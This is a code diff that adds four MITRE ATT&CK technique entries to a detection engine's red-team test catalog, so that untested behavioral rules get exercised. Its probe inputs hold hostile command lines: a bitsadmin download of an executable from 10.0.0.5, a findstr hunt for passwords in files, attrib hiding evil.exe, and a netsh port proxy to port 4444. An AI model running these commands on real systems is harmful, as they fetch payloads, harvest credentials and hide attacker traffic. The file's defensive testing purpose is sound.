@@ -1085,6 +1085,73 @@ OUT_OF_SCOPE = [
     ),
 ]
 
+# =============================================================================
+# EXTENDED (added 2026-08-20)
+# =============================================================================
+# Valkyrie already had behavioral rules for these MITRE techniques, but the
+# catalog was not TESTING them. Each command line below was verified to fire via
+# match_process before being added (an honest DETECT, not a guess), and every
+# tool used (bitsadmin / findstr / attrib / netsh) ships on the standard Windows
+# runner, so a live run actually exercises it. This is how the red-team surface
+# grows: not re-running the same 40, but validating rules that were never tested.
+EXTENDED = [
+    Technique(
+        id="evasion-bits-transfer", technique_id="T1197",
+        technique_name="BITS Jobs (bitsadmin transfer)",
+        tactic="Defense Evasion", art_test_ref="T1197 Test #1",
+        destructive=False, live_vm_safe=True,
+        delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: bitsadmin-transfer rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "bitsadmin.exe", "parent": "cmd.exe",
+            "cmdline": r"bitsadmin.exe /transfer job http://10.0.0.5/t.exe "
+                       r"C:\Users\Public\t.exe", "path": ""},
+        notes="Verified via match_process (labels bitsadmin_transfer, "
+              "download_cradle). bitsadmin ships on Windows.",
+    ),
+    Technique(
+        id="cred-files-hunt", technique_id="T1552.001",
+        technique_name="Unsecured Credentials: Credentials In Files (findstr)",
+        tactic="Credential Access", art_test_ref="T1552.001 Test #1",
+        destructive=False, live_vm_safe=True,
+        delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: cred-hunt rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "findstr.exe", "parent": "cmd.exe",
+            "cmdline": r"findstr /si password *.txt *.xml *.ini", "path": ""},
+        notes="Verified via match_process (cred_hunt). findstr ships on Windows.",
+    ),
+    Technique(
+        id="evasion-hidden-file", technique_id="T1564.001",
+        technique_name="Hide Artifacts: Hidden Files and Directories (attrib +h +s)",
+        tactic="Defense Evasion", art_test_ref="T1564.001 Test #1",
+        destructive=False, live_vm_safe=True,
+        delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: hide-file rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "attrib.exe", "parent": "cmd.exe",
+            "cmdline": r"attrib.exe +h +s C:\Users\Public\evil.exe", "path": ""},
+        notes="Verified via match_process (hide_file). attrib ships on Windows.",
+    ),
+    Technique(
+        id="c2-port-forward", technique_id="T1090",
+        technique_name="Proxy (netsh portproxy)",
+        tactic="Command and Control", art_test_ref="T1090 (netsh portproxy)",
+        destructive=False, live_vm_safe=True,
+        delivery=DELIVERY_REALTIME_ETW,
+        detector_path="valkyrie/behavioral_rules.py: port-forward rule",
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
+        probe="ioa_rule", probe_input={
+            "image": "netsh.exe", "parent": "cmd.exe",
+            "cmdline": "netsh.exe interface portproxy add v4tov4 listenport=8080 "
+                       "connectaddress=10.0.0.5 connectport=4444", "path": ""},
+        notes="Verified via match_process (port_forward). netsh ships on Windows.",
+    ),
+]
+
 ALL_TACTICS = {
     "Execution": EXECUTION,
     "Persistence": PERSISTENCE,
@@ -1094,6 +1161,7 @@ ALL_TACTICS = {
     "Lateral Movement": LATERAL_MOVEMENT,
     "Command and Control": COMMAND_AND_CONTROL,
     "Impact": IMPACT,
+    "Extended (behavioral rules)": EXTENDED,
 }
 
 
